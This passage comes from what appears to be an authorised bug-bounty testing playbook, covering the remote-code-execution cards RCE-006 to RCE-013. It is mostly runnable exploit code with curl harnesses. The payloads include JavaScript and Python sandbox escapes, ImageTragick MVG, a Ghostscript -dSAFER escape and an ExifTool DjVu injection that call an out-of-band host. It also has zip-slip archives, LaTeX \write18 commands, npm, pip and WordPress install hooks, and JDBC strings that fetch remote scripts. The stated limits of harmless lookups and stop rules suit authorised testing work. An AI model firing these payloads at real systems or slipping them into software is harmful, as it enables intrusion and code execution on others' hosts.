  pv adoc      $'rce006a\n\ninclude::/etc/hostname[]\n\nrce006b' asciidoc
  pv rst-miss  $'rce006a\n\n.. include:: /rce006-missing\n\nrce006b' rst
  pv rst       $'rce006a\n\n.. include:: /etc/hostname\n\nrce006b' rst
  pv org       $'rce006a\n#+INCLUDE: "/etc/hostname"\nrce006b' org
  pv puml      $'~~~plantuml\n@startuml\n!include /etc/hostname\n@enduml\n~~~' markdown
  pv kd-opt    $'{::options auto_ids="false" /}\n# rce006 heading' markdown     # Kramdown honours it if the h1 has no id
  for f in "$D"/*.html; do printf '%s: ' "${f##*/}"; tr -d '\n' < "$f" | grep -aoE 'rce006a.{0,200}rce006b|Unresolved directive[^<]{0,80}|"include" directive disabled|No such file[^<]{0,40}|<h1[^>]*>' | head -3 | tr '\n' ' '; echo; done
  ```
  PlantUML answers with an image: download it and read the included line or the error in the diagram.
- **Proof:** the rendered output with `/etc/hostname`'s content between the markers, next to the missing-file
  control's error, with request and response saved. For code execution through a renderer CVE: the host-name
  lookup from the advisory's document with its command replaced.
- **Not a finding when:** Asciidoctor in `secure` mode turns the directive into a link to the path, and in `safe`
  mode re-roots an absolute path inside the document's directory and reports "Unresolved directive": both are
  negatives for a read. docutils prints `"include" directive disabled`. The markup is rendered in the browser.
  Kramdown honours a harmless inline option (`auto_ids`) by design: that is the primitive, and only a version
  before 2.3.1 makes it code execution.
- **Escalate:** a file read follows the LFI chapter's rules: one harmless file in the proof, the rest described.
  A renderer whose version has a code-execution CVE (Kramdown, RDoc, a wiki scripting extension) goes to the CVE
  chapter with this feature as the way in. Diagram servers that fetch `!includeurl` targets are SSR-002.

### RCE-007 · A formula, rule, filter or sort expression we write is evaluated by an engine that reaches functions outside its documented vocabulary

| | |
|---|---|
| **Severity** | High standalone when the expression reads records of another tenant or the engine's own environment; Critical when it reaches the runtime and returns the host name; none for arithmetic inside the documented vocabulary |
| **Requires** | params |
| **Excluded by** | — |
| **Unit** | deployment |
| **Cost** | medium |
| **Weakness** | Code Injection · CWE-94 |
| **Prior art** | #3782701, #3694007, #3656781, #809012 |

- **Where:** features whose input is an expression by design: calculated fields and columns, server-side
  spreadsheet grids and recalculated spreadsheet imports, pricing, discount and eligibility rules, automation
  and workflow conditions, alert thresholds, report builders, delivery and targeting rules (#3656781, an ad
  server's delivery-limitation logic turned into PHP), low-code "custom code" snippets, and search, sort and
  filter arguments that carry scripts or query objects: a GraphQL filter handed to the sift query library, whose
  `$where` runs JavaScript in the application's process (#3782701, $12,000), an Elasticsearch sort script in
  Painless (#3694007, $7,000), a JavaScript sandbox library (#809012). There is no language gate: the engine's
  language is often not the application's.
- **Test:** step one, a value the documented vocabulary computes (`7*191`), shows that the server evaluates, and
  the error of a broken expression names the engine. Step two, a construct the engine's language accepts and the
  vocabulary does not, chosen per engine from the table. The finding is the gap between what the feature
  documents and what the engine does.
- **How:**
  ```bash
  D="$E/evidence/$H/RCE-007"; mkdir -p "$D"; W=$(awk "BEGIN{print 1/$RATE}")
  U="$T/api/fields/preview"                                   # the request that evaluates an expression and returns its value
  ev() { curl -sS "${HDR[@]}" $A -X POST "$U" -H 'Content-Type: application/json' \
    -d "$(jq -nc --arg e "$2" '{expression:$e}')" -o "$D/$1.body" -w "$1\t%{http_code}\t%{size_download}\n"; sleep "$W"; }
  ev arith '7*191'; ev str '"rce"+"007"'; ev broken '7*('
  grep -aoE '1337|rce007|SyntaxError[^"]{0,60}|ReferenceError[^"]{0,60}|ScriptException[^"]{0,60}|painless[^"]{0,40}|Traceback[^"]{0,60}|NameError[^"]{0,60}|mathjs[^"]{0,40}' "$D"/*.body | sort -u
  # step 2: the table's line for the engine step 1 named, for example JavaScript evaluated with new Function or vm
  ev js-host "this.constructor.constructor('return process')().mainModule.require('os').hostname()"
  ev js-dns  "this.constructor.constructor('return process')().mainModule.require('dns').lookup(this.constructor.constructor('return process')().mainModule.require('os').hostname()+'.rce007-js.$OOB',function(){})"
  ```
  ```text
  engine (how the error names it)                 step 2, harmless
  JavaScript: new Function, vm, sift $where       this.constructor.constructor('return process')().mainModule.require('os').hostname()
    (SyntaxError, ReferenceError)                 for sift, the same text as the "$where" member of the filter; ESM: process.getBuiltinModule('os')
  vm2, any version (abandoned in 2023)            the published escapes of CVE-2023-37466 and CVE-2023-37903, with the command replaced by hostname
  mathjs before 3.17.0                            the CVE-2017-1001002 and CVE-2017-1001003 expressions; later mathjs refuses constructor access
  Python eval with emptied builtins               [c for c in ().__class__.__base__.__subclasses__() if c.__name__=='_wrap_close'][0].__init__.__globals__['popen']('hostname').read()
    (Traceback, NameError)
  Painless (ScriptException, "painless")          no runtime access by design (allow-listed classes); read instead (needs two-accounts):
                                                  doc['<field>'].value from a record of our second account B, written with a marker, in A's response
  spreadsheet engine (=7*191 computed in an       =WEBSERVICE("http://rce007-ws.OOB/") where the engine implements and recalculates it: a fetch, SSR chapter
    export, preview or API response)
  SpEL, OGNL, MVEL, JEXL in a rule field          the TPL chapter's expression-language item
  ```
- **Proof:** step one's computed value and step two's host name (or its DNS lookup) from the expression, with
  request and response saved. For a sandboxed engine such as Painless (with `two-accounts`): B's marker value in
  A's response, with B's record created by us and A's own query unable to return it through the documented fields.
- **Not a finding when:** arithmetic and documented functions work: that is the feature. The engine refuses
  everything in step two with its own error ("not allowed", "cannot resolve symbol", "unknown function"). The
  formula runs in the user's own spreadsheet program after an export (CSV injection, client side:
  `csv-injection`). Painless reads only fields of documents our own query already returns. The evaluation
  happens in the browser.
- **Escalate:** one host name, then stop. A read across tenants through a sort or filter script is also an
  access-control finding (BAC). An engine that builds source code from the expression (Python or JavaScript
  text) is RCE-005 in that language. MongoDB's own `$where`, evaluated inside the database, is the NSQ chapter's.

### RCE-008 · An uploaded image reaches ImageMagick's delegates, Ghostscript or ExifTool, and a command embedded in the file runs

| | |
|---|---|
| **Severity** | Critical standalone with the host-name lookup from the converter |
| **Requires** | upload\|url-fetch, file-processing, oob |
| **Excluded by** | — |
| **Unit** | deployment |
| **Cost** | medium |
| **Weakness** | OS Command Injection · CWE-78 |
| **Prior art** | #1154542, #402362, #1838674 |

- **Where:** uploads that come back resized, re-encoded, thumbnailed or stripped of metadata: avatars, logos,
  product images, attachments, "import image from URL", the preview of a PDF or PostScript upload, and metadata
  removal on upload (#1154542, ExifTool, $20,000). Libraries that do not shell out (libvips, sharp, Pillow, Go's
  image packages) are not this card. The tool shows in error text (`convert:`, `identify:`, `magick:`,
  `GPL Ghostscript`, `ExifTool`), in the output's metadata, or in step 0's rendered text.
- **Test:** the parser is chosen from the file's content, not its name, so every payload goes up as `.jpg` with
  `image/jpeg`. ImageMagick: an MVG file whose `url(https:...)` reaches the https delegate's shell command line
  (CVE-2016-3714, ImageTragick: #402362, #1838674). Ghostscript, which ImageMagick calls for PS, EPS and PDF: a
  `-dSAFER` escape that opens a `%pipe%` device (the CVE-2018-16509 form; later releases have their own
  advisories). ExifTool 7.44 to 12.23: a DjVu annotation evaluated as Perl (CVE-2021-22204). A harmless step 0
  prints Ghostscript's product and revision into the thumbnail, which picks the right advisory without
  exploiting anything.
- **How:**
  ```bash
  D="$E/evidence/$H/RCE-008"; mkdir -p "$D"; W=$(awk "BEGIN{print 1/$RATE}")
  up() { curl -sS "${HDR[@]}" $A -F "file=@$D/$1;type=image/jpeg" "$T/api/avatar" -o "$D/$1.resp" -w "%{http_code} $1\n"; sleep "$W"; }
  # 0. no exploit: Ghostscript writes its product name and revision into the rendered image (10012 = 10.01.2)
  cat > "$D/rce008-gsver.jpg" <<'EOF'
  %!PS-Adobe-3.0 EPSF-3.0
  %%BoundingBox: 0 0 420 40
  /Helvetica findfont 16 scalefont setfont 10 14 moveto
  (rce008 ) show product show ( ) show revision 20 string cvs show
  showpage
  EOF
  up rce008-gsver.jpg          # download the stored or thumbnail image and read the line in it
  # 1. ImageMagick https delegate (CVE-2016-3714); \$ keeps $(hostname) for the converter's shell
  cat > "$D/rce008-mvg.jpg" <<EOF
  push graphic-context
  viewbox 0 0 64 64
  fill 'url(https://127.0.0.1/x.jpg"|nslookup "\$(hostname).rce008-mvg.$OOB)'
  pop graphic-context
  EOF
  # 2. Ghostscript -dSAFER escape, CVE-2018-16509 form (for a newer revision from step 0, the advisory's own file)
  cat > "$D/rce008-gs.jpg" <<EOF
  %!PS
  userdict /setpagedevice undef
  save
  legal
  { null restore } stopped { pop } if
  { legal } stopped { pop } if
  restore
  mark /OutputFile (%pipe%nslookup \$(hostname).rce008-gs.$OOB) currentdevice putdeviceprops
  EOF
  # 3. ExifTool DjVu annotation (CVE-2021-22204); bzz and djvumake come with djvulibre
  cat > "$D/ant.txt" <<EOF
  (metadata "\c\${system('nslookup \$(hostname).rce008-exif.$OOB')};")
  EOF
  bzz "$D/ant.txt" "$D/ant.bzz" && djvumake "$D/rce008-exif.jpg" INFO='1,1' BGjp=/dev/null ANTz="$D/ant.bzz"
  date -u +%FT%TZ | tee "$D/sent-at.txt"
  for f in rce008-mvg.jpg rce008-gs.jpg rce008-exif.jpg; do up "$f"; done
  ```
  Converter containers often lack `nslookup`: with no query after a few minutes, send the same three files once
  more with `getent hosts` or `ping -c 1` in its place and a new label.
- **Proof:** the DNS query `<host name>.rce008-<mvg|gs|exif>.$OOB` after the upload of that file, with the file
  and the upload request saved; step 0's image with the Ghostscript revision as supporting evidence.
- **Not a finding when:** the upload is refused as an invalid image and no query arrives: the decoder is a
  library, or ImageMagick's `policy.xml` blocks the coder (`not authorized` in the error is the policy refusing
  MVG, PS or PDF). The query arrives without a host name in front: something resolved the URL inside the MVG
  without a shell. An image CDN or thumbnailing service processed the file (Cloudinary, imgix, a resizing API):
  `third-party`. Step 0's revision is at or above the fixed release of every advisory: patched; record it and
  stop.
- **Escalate:** ImageMagick file reads without command execution (CVE-2022-44268: a PNG `profile` chunk that
  names a path embeds the file in the output) belong to the LFI and UPL chapters. SVG uploads are XXE-007 and
  SSR-008; video uploads are SSR-008 (FFmpeg HLS). The exact build of each tool goes to the CVE chapter.

### RCE-009 · A document converter that opens our uploaded document (LibreOffice headless, unoconv, JODConverter) loads its linked content or runs its embedded script

| | |
|---|---|
| **Severity** | High standalone when linked content pulls a server file into the converted output; Critical when an embedded script or macro runs one command (host-name lookup); none for the converter's callback to our host alone |
| **Requires** | upload\|url-fetch, file-processing, oob |
| **Excluded by** | — |
| **Unit** | deployment |
| **Cost** | medium |
| **Weakness** | Code Injection · CWE-94 |
| **Prior art** | #671935, #361793 |

- **Where:** uploads of office documents that come back as PDF, image previews or thumbnails; "convert to PDF"
  features; document viewers in mail, ticketing and storage products; e-signature and print services (#671935:
  office-file thumbnails made with LibreOffice, local file access and a cloud credential, $4,000; #361793: a PDF
  conversion web service). Convert one plain document first and read the output: `pdfinfo out.pdf` shows
  `Producer: LibreOffice 7.x` with the version, or another engine (Microsoft, Aspose, OnlyOffice, a browser) that
  the rest of this card does not cover.
- **Test:** a document can name outside content that the engine loads while converting: a linked section (text
  pulled from a file or URL), a linked image, an OLE link. A callback from the converter shows it follows links;
  a `file:` link then shows whether it pulls a server file into the output. Script execution needs an engine older
  than the fix of a published script-execution bug (CVE-2018-16858, CVE-2019-9848, CVE-2019-9851 and later
  ones): take the advisory's sample document for the version the producer line shows, with its command replaced
  by one host-name lookup.
- **How:**
  ```bash
  D="$E/evidence/$H/RCE-009"; mkdir -p "$D"; W=$(awk "BEGIN{print 1/$RATE}")
  # an ODT whose body holds a linked section (file or URL) and a linked image on our host, between two markers
  odt() { python3 - "$1" "$2" "http://rce009-img.$OOB/i.png" <<'PY'
  import sys, zipfile
  out, src, img = sys.argv[1:4]
  content = f'''<?xml version="1.0" encoding="UTF-8"?>
  <office:document-content xmlns:office="urn:oasis:names:tc:opendocument:xmlns:office:1.0" xmlns:text="urn:oasis:names:tc:opendocument:xmlns:text:1.0" xmlns:xlink="http://www.w3.org/1999/xlink" xmlns:draw="urn:oasis:names:tc:opendocument:xmlns:drawing:1.0" xmlns:svg="urn:oasis:names:tc:opendocument:xmlns:svg-compatible:1.0" office:version="1.2"><office:body><office:text>
  <text:p>rce009a</text:p>
  <text:section text:name="s1"><text:section-source xlink:href="{src}" xlink:type="simple" xlink:show="embed" text:filter-name="Text"/></text:section>
  <text:p><draw:frame text:anchor-type="as-char" svg:width="1cm" svg:height="1cm"><draw:image xlink:href="{img}" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame>rce009b</text:p>
  </office:text></office:body></office:document-content>'''
  manifest = '''<?xml version="1.0" encoding="UTF-8"?>
  <manifest:manifest xmlns:manifest="urn:oasis:names:tc:opendocument:xmlns:manifest:1.0" manifest:version="1.2">
  <manifest:file-entry manifest:full-path="/" manifest:media-type="application/vnd.oasis.opendocument.text"/>
  <manifest:file-entry manifest:full-path="content.xml" manifest:media-type="text/xml"/></manifest:manifest>'''
  with zipfile.ZipFile(out, 'w') as z:
      z.writestr(zipfile.ZipInfo('mimetype'), 'application/vnd.oasis.opendocument.text')   # first and stored, as ODF requires
      z.writestr('META-INF/manifest.xml', manifest, zipfile.ZIP_DEFLATED)
      z.writestr('content.xml', content, zipfile.ZIP_DEFLATED)
  PY
  }
  odt "$D/rce009-url.odt"  "http://rce009-sec.$OOB/s.txt"     # 1. does the converter load links? two callbacks expected
  odt "$D/rce009-file.odt" "file:///etc/hostname"              # 2. does it pull a server file into the output?
  for f in rce009-url.odt rce009-file.odt; do
    curl -sS "${HDR[@]}" $A -F "file=@$D/$f;type=application/vnd.oasis.opendocument.text" "$T/api/documents" \
      -o "$D/$f.resp" -w "%{http_code} $f\n"; sleep "$W"; done
  # download each converted PDF or preview, then read the text between the markers
  pdftotext "$D/rce009-file.pdf" - | sed -n '/rce009a/,/rce009b/p'
  ```
  For DOCX-only uploads the same two links go into a Word document as an `INCLUDETEXT` field and an external
  image relationship (`TargetMode="External"`).
- **Proof:** the converted output (PDF text or preview image) with the server's `/etc/hostname` between
  `rce009a` and `rce009b`, with the uploaded file and the request; or, on an engine with a script-execution CVE,
  the host-name lookup. The converter's own callback, with a `LibreOffice` User-Agent, identifies the engine.
- **Not a finding when:** the callbacks come from a person's browser previewing the document (a browser
  User-Agent, after a page view), not from the converter. The section stays empty in the output: the engine did
  not update links while converting, a negative. An external service converted the file (Office Online, a
  Google viewer, a conversion API): `third-party`. The output shows the literal link text.
- **Escalate:** an `http:` link that reaches internal addresses is SSR-003 through the same document. Text
  pulled from `file:` is a file read under the LFI chapter's rules. The engine's version decides whether a
  script-execution CVE applies: CVE chapter.

### RCE-010 · An uploaded archive is extracted with `../` names or a symlink, and a file we chose lands in a directory the server serves or executes

| | |
|---|---|
| **Severity** | High standalone for a new file written outside the extraction directory and served back; Critical when that directory executes it and the file prints the host name |
| **Requires** | upload\|url-fetch, file-processing |
| **Excluded by** | — |
| **Unit** | deployment |
| **Cost** | medium |
| **Weakness** | Path Traversal · CWE-22 |
| **Prior art** | #733072, #587854, #519220, #546753 |

- **Where:** features that unpack what we send: "import from ZIP", theme, plugin and template uploads, bulk image
  or document uploads as an archive, backup restore, project and data imports, static-site and documentation
  deploys from an archive (#546753, an extract app; #733072 and #587854, file writes that ended in code
  execution, $12,000 each; #519220, a page-cache write). The traversal encodings are the LFI chapter's zip-slip
  item and the UPL chapter's archive item; this card is about where the file lands and whether it runs.
- **Test:** an extractor that joins the entry name to the target directory without normalising it writes `../`
  entries outside; one that follows a symlink entry writes the next entry through the link. The landing place
  decides the impact: a directory the web server serves (static, `public/`, the upload directory under the web
  root) shows the write; one that executes a handler (`.php` under Apache or PHP-FPM, `.jsp` in Tomcat's webapp
  directory) runs it. Only new, uniquely named files: never an existing file, never a configuration, cron,
  startup or `authorized_keys` path.
- **How:**
  ```bash
  D="$E/evidence/$H/RCE-010"; mkdir -p "$D"; W=$(awk "BEGIN{print 1/$RATE}"); TAG=$(openssl rand -hex 6)
  # 1. one archive: a control entry, and the same small text file at depths 1 to 8 (unique names: nothing is overwritten)
  python3 - "$D/rce010.zip" "$TAG" <<'PY'
  import sys, zipfile
  out, tag = sys.argv[1], sys.argv[2]
  with zipfile.ZipFile(out, 'w') as z:
      z.writestr(f'rce010-{tag}-inside.txt', f'rce010 {tag} inside\n')
      for d in range(1, 9):
          z.writestr('../' * d + f'rce010-{tag}-d{d}.txt', f'rce010 {tag} depth {d}\n')
  PY
  curl -sS "${HDR[@]}" $A -F "file=@$D/rce010.zip;type=application/zip" "$T/api/import" -o "$D/zip.resp" -w '%{http_code}\n'
  # 2. where did the entries land? the web root and the usual served directories, without a session
  for d in $(seq 1 8); do for p in "" uploads/ static/ public/ media/ files/ assets/; do
    c=$(curl -sS "${HDR[@]}" -o "$D/get.body" -w '%{http_code}' "$T/${p}rce010-$TAG-d$d.txt"); sleep "$W"
    [ "$c" = 200 ] && grep -q "rce010 $TAG" "$D/get.body" && echo "FOUND depth $d at /${p}rce010-$TAG-d$d.txt"; done; done | tee "$D/found.txt"
  # 3. tar: a symlink to a served directory (path from error pages or the framework's layout), then one file through it
  python3 - "$D/rce010-link.tar" "$TAG" "/var/www/html" <<'PY'
  import io, sys, tarfile
  out, tag, target = sys.argv[1:4]
  with tarfile.open(out, 'w') as t:
      link = tarfile.TarInfo('rce010-link'); link.type = tarfile.SYMTYPE; link.linkname = target; t.addfile(link)
      data = f'rce010 {tag} via link\n'.encode()
      f = tarfile.TarInfo(f'rce010-link/rce010-{tag}-link.txt'); f.size = len(data); t.addfile(f, io.BytesIO(data))
  PY
  curl -sS "${HDR[@]}" $A -F "file=@$D/rce010-link.tar;type=application/x-tar" "$T/api/import" -o "$D/tar.resp" -w '%{http_code}\n'
  curl -sS "${HDR[@]}" "$T/rce010-$TAG-link.txt" | grep "rce010 $TAG"     # the served directory the symlink named
  ```
  Execution, only when the programme asks for it and the landing directory runs a handler: one more archive whose
  single entry, at the depth that landed, is `rce010-$TAG.php` holding `<?php echo 'rce010-', 191*7, '-',
  gethostname();` (no input, no parameters). Request it once, then overwrite our own file through the same path
  with an empty one and list it in `cleanup.md` for the programme.
- **Proof:** the request for the `rce010-<tag>-d<N>.txt` path returning our content (a file written outside the
  extraction directory and served by the web server), the archive listing (`unzip -l`, `tar tvf`) and the
  upload request. For Critical: the marker's output `rce010-1337-<host name>`.
- **Not a finding when:** the files appear only under the import's own directory with the names cleaned: Python's
  `zipfile.extract`, `tarfile` with the `data` filter, current `unzip` and `bsdtar` strip or refuse `../`. The
  symlink entry is extracted as a regular file whose content is the target path. The served copy comes from the
  application's own download handler reading the extraction directory, which is no traversal. A separate storage
  service unpacked the archive (`third-party`). Archive bombs are denial of service (`dos`): never send one.
- **Escalate:** a write into a served directory on the application's own origin is also stored XSS through an
  `.html` or `.svg` file: XSS chapter. A write into a template directory is the TPL chapter's. The git-import
  variant is RCE-004.

### RCE-011 · A LaTeX renderer compiles text we control: `\input` puts a server file into the PDF, and `\write18` runs a command when shell escape is on

| | |
|---|---|
| **Severity** | High standalone for a server file read into the output by `\input`; Critical when shell escape runs a command (its output in the PDF, or the host-name lookup); none when the text is escaped before compilation |
| **Requires** | render |
| **Excluded by** | — |
| **Unit** | deployment |
| **Cost** | low |
| **Weakness** | Code Injection · CWE-94 |
| **Prior art** | #1098793, #1628209 |

- **Where:** features that typeset: maths in comments, quizzes and course pages rendered to images or SVG on the
  server; PDFs of invoices, certificates, CVs, reports and papers built from a LaTeX template with our fields in
  it (name, title, address, free text); Markdown-to-PDF exports through Pandoc and pdfLaTeX; journal and thesis
  submission systems. The output names TeX: `pdfinfo out.pdf` shows `Producer: pdfTeX-1.40.x`, `XeTeX` or
  `LuaTeX`, often with `Creator: LaTeX with hyperref`. No disclosed report in the library names LaTeX; the two
  cited are renderer reads of the same shape (a diagram server and a PDF generator that read or fetch what the
  document names).
- **Test:** TeX reads files with `\input` and `\openin`, and TeX Live's default `openin_any = a` lets it read any
  file the process can, so a read works with shell escape off. Running programs depends on the shell-escape
  mode: 0 off, 2 restricted to a list of programs such as `kpsewhich` and `bibtex`, 1 unrestricted
  (`-shell-escape`). Read the mode with a primitive before trying a command. In a maths field the text sits
  inside `$...$` or `\(...\)`: close it first and reopen it after.
- **How:**
  ```bash
  D="$E/evidence/$H/RCE-011"; mkdir -p "$D"; W=$(awk "BEGIN{print 1/$RATE}")
  tx() { curl -sS "${HDR[@]}" $A -X POST "$T/api/certificates/preview" -H 'Content-Type: application/json' \
      -d "$(jq -nc --arg n "$2" '{name:$n}')" -o "$D/$1.pdf" -w "$1\t%{http_code}\t%{size_download}\n"; sleep "$W"
    pdftotext "$D/$1.pdf" - 2>/dev/null | grep -ao 'rce011.\{0,80\}'; }
  tx calc 'rce011-\the\numexpr191*7\relax'                    # TeX evaluated our text: rce011-1337
  tx mode 'rce011-se\the\pdfshellescape'                      # pdfTeX: 0 off, 1 on, 2 restricted (XeTeX, LuaTeX: \the\shellescape)
  tx read 'rce011-[\input{/etc/hostname}]'                    # one harmless file
  tx cmd  'rce011-[\input|"hostname" ]'                       # mode 1 only: the command's output in the PDF
  tx dns  "\\immediate\\write18{nslookup \$(hostname).rce011.$OOB}rce011-sent"   # mode 1, when nothing shows in the PDF
  ```
- **Proof:** the `pdftotext` output with `rce011-1337` (TeX evaluated our text) and the content of
  `/etc/hostname` between the brackets, or the command's output in mode 1, with the request and the PDF saved;
  for `\write18` without visible output, the host-name lookup.
- **Not a finding when:** the payload comes back as literal text with its backslashes (the field is escaped with
  `\textbackslash` or set verbatim): negative. `\the\numexpr...` prints as typed: not TeX (KaTeX or MathJax
  renders the maths in JavaScript, on the server or in the browser, and has no `\input`). `\input` fails with
  "I can't find file" for an absolute path: `openin_any = p`, the paranoid setting. Mode 2 refuses `nslookup`:
  restricted shell escape works as designed; report the read only.
- **Escalate:** the read follows the LFI chapter's rules: one harmless file in the proof, the rest described
  (configuration and secrets are readable the same way; do not read them). In mode 1 stop at `hostname`. A
  renderer that turns out to be a headless browser rather than TeX is SSR-007.

### RCE-012 · A role below administrator can use a feature that runs code by design, and one harmless command runs through it

| | |
|---|---|
| **Severity** | Critical standalone when the lower role runs one command (host-name lookup or output); High when it can save code or a command that a schedule or an administrator's action will run; none for an administrator using the feature, which is the design |
| **Requires** | roles, priv-accounts |
| **Excluded by** | — |
| **Unit** | deployment |
| **Cost** | medium |
| **Weakness** | Privilege Escalation · CWE-269 |
| **Prior art** | #2325023, #2332623, #841397, #1107282 |

- **Where:** in the administrator's walk of the tenant (PB-04), every feature that executes something by design:
  script and query consoles, "run command" diagnostics, scheduled jobs and cron editors with a command or script
  field, webhook and automation actions that run a script, theme, template and code editors that save
  server-side code, plugin, extension and module uploads, backup and restore with pre- or post-commands,
  settings that hold the path of an external program (image converter, virus scanner, mail transfer agent, PDF
  tool), custom-code steps in workflows, and management consoles with a reduced editor role (#2325023 and
  #2332623: an appliance console's editor role that reached root). Then the same requests with the lower role's
  session. #841397 (a file upload by a low-privilege role that ran PHP) and #1107282 (a REST privilege
  escalation to administrator, then code) are the two ways such reports usually open.
- **Test:** the feature runs code by design for the role that owns it; the check that keeps other roles out sits
  in the UI or on some routes only. Replay the administrator's save or run request with the lower role's session,
  changing only the session (with its CSRF token) and the command, and see whether it is accepted and runs.
- **How:**
  ```bash
  D="$E/evidence/$H/RCE-012"; mkdir -p "$D"; W=$(awk "BEGIN{print 1/$RATE}")
  ADMIN="-H @$E/accounts/ADM.headers"     # our administrator of A's tenant; $A is the lower role in the same tenant
  curl -sS "${HDR[@]}" $A "$T/api/me" | jq -c '{id,role}'; curl -sS "${HDR[@]}" $ADMIN "$T/api/me" | jq -c '{id,role}'
  # 1. the code-running features: names in the routes the administrator's walk recorded and in the bundles
  grep -hoiE '/[A-Za-z0-9_/{}:.-]*(script|console|eval|exec|command|cron|schedul|job|task|hook|plugin|extension|addon|module|package|install|theme|template|editor|backup|restore|binary|executable)[A-Za-z0-9_/{}:.-]*' \
    "$E/recon/$H/routes-from-js.txt" "$E/recon/$H/map.md" 2>/dev/null | sort -u | head -60
  # 2. the administrator's saved request for one feature, replayed by the lower role with the command changed to one lookup
  BODY=$(jq -c --arg c "nslookup \$(hostname).rce012-job.$OOB" '.command = $c | .name = "rce012"' "$D/admin-job-request.json")
  curl -sS "${HDR[@]}" $A -X POST "$T/api/admin/jobs" -H 'Content-Type: application/json' -d "$BODY" \
    -D "$D/lower.headers" -o "$D/lower.body" -w '%{http_code}\n'; sleep "$W"
  # 3. the job as the administrator sees it; delete it from the administrator's session afterwards and note it in cleanup.md
  curl -sS "${HDR[@]}" $ADMIN "$T/api/admin/jobs" | jq -c '.[] | select(.name=="rce012")'
  ```
  A console that answers in the response gets `hostname` (in a Groovy console,
  `java.net.InetAddress.getLocalHost().getHostName()`); a plugin upload gets RCE-013's probe plugin.
- **Proof:** the lower role's request and 2xx response, the job or code object as the administrator sees it
  (created by the lower role), and the host-name lookup or command output from that run; the product's
  permission table, or the lower role's UI, showing the feature is not theirs.
- **Not a finding when:** the role that succeeded holds the permission in the product's own permission table (a
  custom role, a "developer" role whose job this is). The request is accepted but nothing runs and the
  administrator's view shows nothing. The console answers without any session: an exposed Jenkins or Groovy
  console is the CLD chapter's and CVE-008's (#768266, #403402). An administrator running code through a
  code-editing feature is the product (administrators editing PHP, using a script console): informative unless
  a documented hardening that the role is meant to respect is bypassed.
- **Escalate:** the lower role reaching the feature without running anything yet is BAC-011's authorisation miss,
  raised to Critical by what the feature does. A stored XSS that runs in our administrator's browser and sends
  the same request is the chain for features only administrators reach (XSS chapter, proven on our own
  administrator account). A run or install request without CSRF protection: CSR chapter.

### RCE-013 · A package, plugin, driver or connection string we give a hosted product's install or integration feature runs our code on the provider's host, outside the tenant's sandbox

| | |
|---|---|
| **Severity** | Critical standalone when install-time or driver code runs on a host shared with other tenants or holding the provider's credentials; High when a driver only fetches a script or class description we named; none when the code runs in the per-tenant sandbox the product sells for customer code |
| **Requires** | account, upload\|url-fetch, oob |
| **Excluded by** | — |
| **Unit** | deployment |
| **Cost** | high |
| **Weakness** | Inclusion of Functionality from Untrusted Control Sphere · CWE-829 |
| **Prior art** | #518637, #1418891, #1547877 |

- **Where:** hosted products that install or load something the customer supplies: plugin, extension and widget
  uploads (#518637, a widget plugin, $10,000), job uploads to managed stream and batch engines (#1418891, a Flink
  job JAR, $6,000), connector and driver uploads and settings in managed data products (#1547877, a Kafka Connect
  JDBC driver file, $5,000), data-source connection strings in BI, ETL and low-code tools, "install package" and
  requirements fields in notebooks, AI code interpreters, serverless functions and build steps. The question for
  each: where does it run, and is that place meant to run customer code?
- **Test:** install-time code runs by design wherever the product installs: npm lifecycle scripts, a Python
  sdist's `setup.py`, a plugin's activation hook, a driver's class loading. A JDBC option that loads a script or
  instantiates a class we name is code loading through a connection string (H2 `INIT=RUNSCRIPT`; pgjdbc
  `socketFactory` before 42.2.25 and 42.3.2, CVE-2022-21724). The finding is the host: the probe resolves its
  host name; compare it across two installs (two projects or tenants of ours) and with the isolation the product
  documents. One host for both, a host name of the provider's fleet, or credentials the code could read
  (described, not read) make it a finding; a fresh per-tenant sandbox does not.
- **How:**
  ```bash
  D="$E/evidence/$H/RCE-013"; mkdir -p "$D/npm/package" "$D/py/rce013-probe-0.0.1" "$D/wp/rce013-probe"
  # built with tar and zip only, so nothing runs on this machine; each probe resolves one name with its own runtime
  cat > "$D/npm/package/package.json" <<EOF
  {"name":"rce013-probe","version":"0.0.1","description":"authorised bug bounty test: one DNS lookup on install","scripts":{"preinstall":"node -e \"require('dns').lookup(require('os').hostname()+'.rce013-npm.$OOB',function(){})\""}}
  EOF
  tar czf "$D/rce013-probe-0.0.1.tgz" -C "$D/npm" package
  cat > "$D/py/rce013-probe-0.0.1/setup.py" <<EOF
  import socket
  try:
      socket.gethostbyname(socket.gethostname() + '.rce013-pip.$OOB')
  except Exception:
      pass
  from setuptools import setup
  setup(name='rce013-probe', version='0.0.1')
  EOF
  printf 'Metadata-Version: 1.0\nName: rce013-probe\nVersion: 0.0.1\n' > "$D/py/rce013-probe-0.0.1/PKG-INFO"
  tar czf "$D/rce013-probe-0.0.1.tar.gz" -C "$D/py" rce013-probe-0.0.1
  cat > "$D/wp/rce013-probe/rce013-probe.php" <<EOF
  <?php
  /* Plugin Name: rce013 probe (authorised bug bounty test) */
  register_activation_hook(__FILE__, function () { @gethostbyname(gethostname() . '.rce013-wp.$OOB'); });
  EOF
  (cd "$D/wp" && zip -qr "$D/rce013-probe-wp.zip" rce013-probe)
  # install through the product's own feature (upload, or a URL on $OOB when it takes package URLs), once per project
  curl -sS "${HDR[@]}" $A -F "file=@$D/rce013-probe-0.0.1.tgz;type=application/gzip" "$T/api/functions/rce013/dependencies" \
    -o "$D/npm.resp" -w '%{http_code}\n'
  ```
  ```text
  connection-string probes for a data-source or connector field; serve nothing at the paths: the request is the proof
  H2                      jdbc:h2:mem:rce013;INIT=RUNSCRIPT FROM 'http://rce013-h2.OOB/x.sql'
  PostgreSQL (pgjdbc)     jdbc:postgresql://127.0.0.1:5432/x?socketFactory=org.springframework.context.support.ClassPathXmlApplicationContext&socketFactoryArg=http://rce013-pg.OOB/x.xml
  MySQL Connector/J       autoDeserialize with a rogue server is deserialization: DSR chapter
  JNDI names, JAAS        DSR-004
  ```
- **Proof:** the host-name lookup for each install, with the upload or setting request, and the comparison that
  makes it a finding: the same host name from two of our tenants, a host name or address range of the provider's
  shared fleet, or the product's own statement of the isolation it promises. For a connection string: the
  driver's request for `/x.sql` or `/x.xml` from the product's address (User-Agent `Java/...`), with the string
  that caused it.
- **Not a finding when:** the code runs in the sandbox the product sells for customer code (a function runtime, a
  notebook kernel, a per-job CI container) and the two installs show different, short-lived host names: by
  design (Graveyard). The lookup comes from our own machine: a local build ran the script (build with `tar`,
